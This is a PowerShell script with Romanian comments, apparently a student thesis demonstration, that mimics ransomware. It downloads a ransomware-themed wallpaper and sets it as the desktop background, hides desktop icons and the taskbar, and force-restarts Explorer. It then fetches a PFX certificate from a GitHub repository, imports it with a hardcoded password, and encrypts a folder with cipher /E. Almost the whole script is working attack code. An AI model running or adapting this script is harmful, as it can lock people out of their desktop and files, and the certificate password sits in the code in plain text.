# Defineste si apeleaza o functie API de Windows pentru a ajuta la schimbarea wallpaper-ului, precum si cea de ascundere taskbar

Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;

public class Wallpaper {
    [DllImport("user32.dll", CharSet = CharSet.Auto)]
    public static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);
}

public class Taskbar {
        [DllImport("user32.dll")]
        public static extern IntPtr FindWindow(string className, string windowText);
        [DllImport("user32.dll")]
        public static extern int ShowWindow(IntPtr hwnd, int command);

        public const int SW_HIDE = 0;
        public const int SW_SHOW = 1;
    }
"@


Try{

# Descarca imaginea
$imageUrl = "https://www.smartpcuser.com/wp-content/uploads/2020/07/wholocked-ransomware-wallpaper.png" 
$outputPath = "C:\Users\ionut\Downloads\image.jpg" 
Invoke-WebRequest -Uri $imageUrl -OutFile $outputPath 
Write-Output "Image downloaded successfully to $outputPath"

# Minimizeaza toate aplicatiile care ruleaza
$shell = New-Object -ComObject Shell.Application
$shell.MinimizeAll()

# Seteaza imaginea descarcata ca desktop background
[Wallpaper]::SystemParametersInfo(20, 0, "C:\Users\ionut\Downloads\image.jpg" , 3)

# Ascunde icons de pe desktop
Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" -Name HideIcons -Value 1

# Restart Explorer
Stop-Process -ProcessName explorer -Force
Start-Process explorer

# Inchide noua instanta de Windows Explorer
$wex = New-Object -ComObject wscript.shell;
Sleep 3
$wex.SendKeys('%{F4}')
Sleep 2

# Ascunde taskbar
$taskbarHwnd = [Taskbar]::FindWindow("Shell_TrayWnd", "")
[Taskbar]::ShowWindow($taskbarHwnd, [Taskbar]::SW_HIDE)

# Define the URL of the file to download
$fileUrl = "https://raw.githubusercontent.com/haiduc29/Script-Licenta/main/certificate.pfx"

# Define the path where the file will be saved
$outputPath = "C:\Users\ionut\Downloads\certificate.pfx"

# Download the file
Invoke-WebRequest -Uri $fileUrl -OutFile $outputPath

# Define the path to the certificate and the password
$certPath = "C:\Users\ionut\Downloads\certificate.pfx"
$certPassword = ConvertTo-SecureString -String "1993" -Force -AsPlainText

# Import the certificate
$cert = Import-PfxCertificate -FilePath $certPath -CertStoreLocation Cert:\CurrentUser\My -Password $certPassword

# Output the thumbprint of the imported certificate
$certThumbprint = $cert.Thumbprint
Write-Host "Imported certificate with thumbprint: $certThumbprint"

# Define the path to the folder to be encrypted
$folderPath = "C:\Users\ionut\Test"

# Encrypt the folder
cipher /E /S:"$folderPath"
Write-Host "Folder encrypted successfully."

# Check the encryption status
$folder = Get-Item $folderPath
if ($folder.Attributes -band [System.IO.FileAttributes]::Encrypted) {
    # Define the content you want to write to the file
    $fileContent = @"
    Success
    "@
    
    # Define the path and filename for the new file
    $filePath = "C:\Users\ionut\Test\log.txt"
    
    # Create the file and write the content to it
    Set-Content -Path $filePath -Value $fileContent
} else {
    # Define the content you want to write to the file
    $fileContent = @"
    Fail
    "@
    
    # Define the path and filename for the new file
    $filePath = "C:\Users\ionut\Test\log.txt"
    
    # Create the file and write the content to it
    Set-Content -Path $filePath -Value $fileContent
}
}

Catch {"Scriptul a returnat eroare"}
